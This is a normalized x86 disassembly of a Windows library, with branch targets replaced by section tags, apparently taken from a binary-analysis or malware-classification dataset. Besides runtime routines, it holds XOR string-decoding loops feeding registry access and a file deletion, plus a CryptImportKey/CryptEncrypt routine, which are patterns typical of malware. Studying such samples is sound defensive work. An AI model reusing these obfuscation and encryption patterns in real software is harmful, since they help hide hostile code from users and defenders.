mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1004fd6f
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10055531
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_1001116c
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10041dbf
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1002fff7
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_1006a508
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1005bb8e
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_1000cb79
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
sub_1003009f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10041a88
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_1005df26
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_10041a88
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_10041a88
push 0x1
mov edi eax
call sub_10041a88
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_1003c06a
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_1003013b
push 0x10
mov eax sub_1007ffbb
call sub_100097c8
mov edi ecx
mov ecx [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_10033ef0
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_10069ce0
mov esi [ ebp + 0x28 ]
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x25
jne r-xdata
mov esi [ ebp + 0x20 ]
cmp al 0x20
jne r-xdata
push 0x0
mov eax [ edi ]
inc esi
movzx ecx [ esi ]
push ecx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x1c ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x1c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004db01
retn 0x24
or [ esi ] 0x1
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
jne r-xdata
inc esi
movzx ebx [ ebp + 0x12 ]
lea eax [ edi + 0x14 ]
push eax
movzx eax [ esi ]
push 0x0
push eax
call sub_1003088d
add esp 0xc
cmp bx ax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
mov ebx [ ebp - 0x14 ]
mov esi [ ebp + 0x20 ]
or [ esi ] 0x2
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005576a
push [ ebp + 0x12 ]
mov eax [ ebx ]
push 0x48
mov ecx ebx
call [ eax + 0x8 ]
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005576a
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
sub_10030280
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0x98 ] ebx
xor eax eax
lea ecx [ ecx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfffb
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x98 ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
mov ecx [ ebp - 0x98 ]
cmp ecx ebx
je r-xdata
pop edi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax 0x2
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xa0 ]
mov [ ebp - 0xa0 ] ebx
call sub_10054860
test eax eax
je r-xdata
push esi
mov esi [ ebp - 0xa0 ]
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x62
call sub_100050e0
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
mov [ ebp - 0x9c ] 0x3
call edx
mov eax [ ebp - 0x9c ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x44 ]
mov eax 0x51
call sub_100050e0
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
pop esi
push eax
mov [ ebp - 0x9c ] 0x4
call edx
mov eax [ ebp - 0x9c ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ebx [ esi ]
add edi 0x120
call sub_1005d250
mov ebx [ esi + 0x4 ]
call sub_100393b0
call sub_1001e6d0
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
pop esi
push eax
call edx
mov eax [ ebp - 0x9c ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10030410
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
pop ebp
retn
nop
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_1003042d
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x3e
xor edx edx
pop ecx
div ecx
xor esi esi
lea eax [ edx * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
push edi
push esi
push [ ebp - 0x4 ]
mov [ esi ] edi
call [ InterlockedCompareExchange@IAT ]
cmp eax edi
jne r-xdata
push 0xc
call sub_10008102
mov esi eax
pop ecx
test esi esi
je r-xdata
test esi esi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
mov ebx edi
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_1007ddbf
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push [ esi + 0x8 ]
call sub_10037b81
push esi
call sub_10022b5a
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_10022b5a
pop ecx
mov [ esi + 0x4 ] ebx
sub_100304d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100803b0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
push 0x10
mov [ ebp - 0x4 ] edi
call sub_10055606
add esp 0x4
cmp eax edi
je r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10030590
push ebp
mov ebp esp
sub esp 0x2ac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x208
lea eax [ ebp - 0x2ac ]
push 0x0
push eax
call sub_10079a10
mov ecx [ r--data ]
add esp 0xc
xor esi esi
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe6
and edx 0xff
mov [ ebp + eax * 2 - 0xa4 ] dx
inc eax
cmp eax 0x3d
jb r-xdata
lea ecx [ ebp - 0xa4 ]
push ecx
xor eax eax
push 0x80000001
mov [ ebp - 0x2a ] ax
call sub_1004b710
add esp 0x8
test eax eax
je r-xdata
mov ecx [ r--data ]
xor eax eax
nop
mov esi 0x1
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffb2
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
push 0x104
lea ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x28 ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call [ ExpandEnvironmentStringsW@IAT ]
lea eax [ ebp - 0x2ac ]
push eax
call [ DeleteFileW@IAT ]
test eax eax
mov eax 0x2
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax esi
sub_10030670
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x20 ] 0x0
push edi
mov ebx rw-data
je r-xdata
mov edi ebx
push 0x164
push 0x1
call sub_1000977c
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
mov [ esi + 0xd4 ] edi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax esi
mov ecx edi
call sub_1007c564
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ edi + 0xb4 ] 0x1
jmp r-xdata
push edi
call sub_10052e0c
push edi
call sub_10022b5a
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xd4 ]
cmp eax ebx
je r-xdata
sub_100306ed
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
call sub_10007cfe
mov esi [ eax + 0x8 ]
call sub_1005150b
jmp r-xdata
xor ecx ecx
mov [ eax ] cx
push [ ebp + 0xc ]
call sub_1003042d
mov esi [ ebp + 0x14 ]
cmp [ esi ] 0x0
pop ecx
mov ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp + 0xc ] eax
test esi esi
jne r-xdata
test ebx ebx
jne r-xdata
mov al [ edi ]
push ebx
mov [ esi + 0x1 ] al
call sub_10066fa7
pop ecx
cmp eax 0x1
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
movzx ecx [ edi ]
mov [ eax ] cx
movzx eax [ edi ]
mov ecx [ ebx + 0x4 ]
movzx eax [ ecx + eax + 0x1d ]
and eax 0x4
call sub_1000dcee
movzx ecx [ edi ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
and [ esi ] 0x0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x2
push esi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_10066fa7
pop ecx
cmp [ ebp + 0x10 ] eax
jae r-xdata
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
push ebx
call sub_10066fa7
pop ecx
cmp eax 0x1
jle r-xdata
mov al [ edi ]
push 0xfffffffe
mov [ esi ] al
pop eax
jmp r-xdata
call sub_1004fd6f
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push ebx
call sub_10066fa7
pop ecx
push eax
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_10066fa7
pop ecx
jmp r-xdata
jmp r-xdata
sub_10030860
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003be34
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_1003088d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_100306ed
mov ax [ ebp - 0x4 ]
add esp 0x14
leave
retn
sub_100308c0
cmp esi ebx
je r-xdata
mov eax esi
retn
mov eax [ esi ]
xor ecx ecx
cmp eax ecx
je r-xdata
mov [ esi ] ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov edx [ ebx ]
mov [ esi ] edx
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov edx [ ebx + 0x8 ]
mov [ esi + 0x8 ] edx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
push edi
mov edi [ esi + 0x4 ]
call sub_10020290
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
xor ecx ecx
pop edi
sub_10030910
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x1
jne r-xdata
cmp [ eax + 0x14 ] 0x8
jb r-xdata
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov edx [ ebp + 0x8 ]
push edi
lea edi [ eax + edx * 2 ]
test ecx ecx
je r-xdata
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov dx [ ebp + 0x10 ]
mov [ eax + ecx * 2 ] dx
pop ebp
retn 0xc
mov eax [ eax ]
pop edi
pop ebp
retn 0xc
mov eax [ ebp + 0x10 ]
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
sub_100309b2
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_10079b60
lea esi [ eax + 0x1 ]
push esi
call sub_1004ac7a
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_1006605f
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_100309f2
push 0xc
push r--data
call sub_10079bf0
call sub_10039c8c
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_10043f7b
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10030a8d
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_10079c35
retn
push 0x20
call sub_1006818d
cmp esi rw-data
je r-xdata
push esi
call sub_10022b5a
pop ecx
sub_10030aa0
push ebp
mov ebp esp
push ecx
push 0xffffffff
push 0x0
push eax
mov [ ebp - 0x4 ] 0x0
call sub_10043930
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_10036380
mov eax esi
mov esp ebp
pop ebp
retn
sub_10030ad6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx eax
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov cx [ ebp + 0xc ]
cmp [ eax ] cx
je r-xdata
cmp [ eax ] cx
jne r-xdata
pop ebp
retn
xor eax eax
sub eax 0x2
cmp eax edx
je r-xdata
sub_10030b10
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x20 ]
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x24 ]
mov [ ecx + 0x8 ] edx
mov edx [ eax + 0x28 ]
mov [ ecx + 0xc ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x10 ] eax
pop ebp
retn
sub_10030b33
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10061e8a
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_10030bd0
push ebp
mov ebp esp
mov edx [ rw-data ]
mov eax [ edx + 0x10 ]
push esi
mov esi [ edx + 0xc ]
cmp esi eax
je r-xdata
or eax 0xffffffff
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
cmp esi eax
jne r-xdata
add esi 0x8
cmp esi eax
jne r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
cmp ecx eax
ja r-xdata
cmp [ esi ] ecx
je r-xdata
push ebx
push edi
mov edi [ ebp + 0x10 ]
lea ebx [ ecx + edi ]
cmp ebx eax
jb r-xdata
mov eax [ edx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push edi
push eax
push ecx
call sub_100796a0
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
pop edi
pop ebx
pop esi
pop ebp
retn
sub eax ecx
mov edi eax
sub_10030c50
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x34 ] eax
add eax 0x1c
push eax
push r--data
push 0x1
push 0x0
push r--data
mov ebx edx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] eax
call [ CoCreateInstance@IAT ]
test eax eax
jns r-xdata
push esi
push edi
push r--data
mov [ ebp - 0x28 ] 0x1
xor edi edi
call [ lstrlenA@IAT ]
mov ecx r--data
mov esi ebx
cmp eax 0x4
jb r-xdata
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
mov edx [ esi ]
cmp edx [ ecx ]
jne r-xdata
mov ecx [ ebp - 0x34 ]
push r--data
mov [ ecx + 0x140 ] 0x1
call [ lstrlenA@IAT ]
mov edi eax
mov dl [ ecx ]
cmp dl [ esi ]
jne r-xdata
mov eax [ ebp - 0x2c ]
sub eax edi
push eax
add ebx edi
push ebx
call [ SysAllocStringByteLen@IAT ]
mov edx [ ebp - 0x30 ]
mov esi eax
mov eax [ edx ]
mov ecx [ eax ]
lea edx [ ebp - 0x28 ]
push edx
push esi
push eax
mov eax [ ecx + 0x104 ]
call eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
sub eax 0x4
add ecx 0x4
add esi 0x4
cmp eax 0x4
jae r-xdata
push esi
call [ SysFreeString@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
xor eax eax
cmp eax 0x1
jbe r-xdata
inc eax
cmp eax 0xf
jb r-xdata
push esi
call [ SysFreeString@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov dl [ ecx + 0x1 ]
cmp dl [ esi + 0x1 ]
jne r-xdata
cmp eax 0x2
jbe r-xdata
mov al [ ecx + 0x2 ]
cmp al [ esi + 0x2 ]
jne r-xdata
sub_10030d90
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100014b7
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_10050f50
pop esi
mov esp ebp
pop ebp
retn
inc eax
mov [ esi + 0x4 ] eax
sub_10030dc0
push ebp
mov ebp esp
push ecx
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edi
sar eax 0x1
push eax
push edx
call sub_10025720
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_10036380
mov eax esi
pop edi
mov esp ebp
pop ebp
retn
sub_10030e0c
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push ebx
push 0x1
push ebx
push ebx
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0xc ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
inc eax
mov eax [ ebp + 0xc ]
push [ eax ]
mov esi [ ebp + 0x8 ]
mov edi [ CryptEncrypt@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push [ esi ]
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
call edi
test eax eax
jne r-xdata
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp - 0x4 ]
mov [ ecx ] eax
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0xc ]
call [ CryptReleaseContext@IAT ]
pop edi
mov eax esi
pop esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ ebp - 0x8 ]
push [ esi ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push [ ebp - 0x8 ]
mov [ esi ] eax
push [ ebp + 0xc ]
push eax
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
call edi
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_10030ef2
push 0x64
mov eax sub_1007f7e0
call sub_1001bb6b
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
call sub_1001fccb
mov ebx eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_10051f6c
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x38 ] eax
je r-xdata
add edi 0x8
push edi
push 0x0
push 0x30
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] edi
call sub_1003088d
add esp 0xc
push [ ebp - 0x5c ]
movzx ebx ax
mov eax [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_100081b8
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov eax [ ebp + 0x18 ]
and eax 0xe00
cmp eax 0x400
